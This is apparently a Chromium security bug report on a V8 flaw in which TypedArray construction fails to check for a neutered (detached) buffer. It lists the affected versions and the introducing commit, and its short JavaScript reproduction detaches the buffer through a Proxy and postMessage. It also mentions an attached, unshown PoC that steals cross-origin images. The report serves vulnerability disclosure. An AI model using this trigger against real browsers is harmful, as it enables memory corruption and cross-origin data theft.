<b>VULNERABILITY DETAILS</b>
https://cs.chromium.org/chromium/src/v8/src/builtins/builtins-typed-array-gen.cc?rcl=70d24bb21e7015995b53f06dec6f27afc3823040&l=564

|TypedArrayBuiltinsAssembler::ConstructByArrayLike()| calls |TypedArrayInitialize()| which might be observable to user
JavaScript if |buffer_constructor| is a JSProxy because |JSFunction::GetDerivedMap()| is observable, and then the fast
path of |ConstructByArrayLike()| doesn't check if the source array buffer has been neutered.

<b>VERSION</b>
Google Chrome 68.0.3418.2 (Official Build) dev (64-bit) (cohort: Dev)
Google Chrome 68.0.3421.0 (Official Build) canary (64-bit) (cohort: Clang-64)
Microsoft Windows Version 10.0.16299.371
The bug has been introduced in commit c68f863d7389f396b04f578a461c9fb386eb8535.

<b>REPRODUCTION CASE</b>
<script>
buffer = new ArrayBuffer(1024 * 1024);
buffer.constructor = {[Symbol.species]: new Proxy(function(){}, {get: _ => {
  try {
    postMessage("", "", [buffer]);
  } catch {}
}})};
array1 = new Uint8Array(buffer, 0, 1024);
array2 = new Uint8Array(array1);
</script>

A PoC that can steal cross-origin images is attached.
